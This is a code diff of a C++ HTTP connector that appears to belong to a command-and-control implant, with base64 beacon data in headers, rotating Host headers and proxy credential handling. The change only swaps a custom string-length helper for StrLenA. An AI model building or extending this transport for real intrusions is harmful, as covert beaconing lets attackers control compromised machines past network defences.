@@ -36,13 +36,6 @@ int _atoi(const char* str)
 	return result * sign;
 }
 
-DWORD _strlen(CHAR* str)
-{
-	int i = 0;
-	if (str != NULL)
-		for (; str[i]; i++);
-	return i;
-}
 
 void* ConnectorHTTP::operator new(size_t sz)
 {
@@ -98,9 +91,9 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 {
 	LPSTR encBeat = b64_encode(beat, beatSize);
 
-	ULONG enc_beat_length = _strlen(encBeat);
-	ULONG param_length    = _strlen((CHAR*)profile.parameter);
-	ULONG headers_length  = _strlen((CHAR*)profile.http_headers);
+	ULONG enc_beat_length = StrLenA(encBeat);
+	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
+	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);
 
 	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
 	memcpy(HttpHeaders, profile.http_headers, headers_length);
@@ -140,7 +133,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->proxy_password = (CHAR*)profile.proxy_password;
 
 	if (this->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
-		ULONG hostLen = _strlen((CHAR*)profile.proxy_host);
+		ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
 		WORD port = profile.proxy_port;
 		CHAR portStr[6];
 		int portIdx = 0;
@@ -245,9 +238,9 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 					}
 
 					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
-						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, _strlen(this->proxy_username));
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
 						if (this->proxy_password != NULL) {
-							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, _strlen(this->proxy_password));
+							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
 						}
 					}
 
@@ -256,8 +249,8 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 					CHAR* tmpHeaders = NULL;
 					if (this->hh_count > 0) {
 						CHAR* currentHH = this->host_headers[this->hh_index];
-						ULONG hhLen = _strlen(currentHH);
-						ULONG baseLen = _strlen(this->headers);
+						ULONG hhLen = StrLenA(currentHH);
+						ULONG baseLen = StrLenA(this->headers);
 						// "Host: " (6) + hhLen + "\r\n" (2) + baseLen + null (1)
 						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, 6 + hhLen + 2 + baseLen + 1);
 						ULONG off = 0;
@@ -270,10 +263,10 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						reqHeaders = tmpHeaders;
 					}
 
-					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)_strlen(reqHeaders), (LPVOID)data, (DWORD)data_size);
+					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);
 
 					if (tmpHeaders) {
-						memset(tmpHeaders, 0, _strlen(tmpHeaders));
+						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
 						this->functions->LocalFree(tmpHeaders);
 					}
 					if (connected) {
@@ -405,7 +398,7 @@ void ConnectorHTTP::RecvClear()
 
 void ConnectorHTTP::CloseConnector()
 {
-	DWORD l = _strlen(this->headers);
+	DWORD l = StrLenA(this->headers);
 	memset(this->headers, 0, l);
 	this->functions->LocalFree(this->headers);
 	this->headers = NULL;
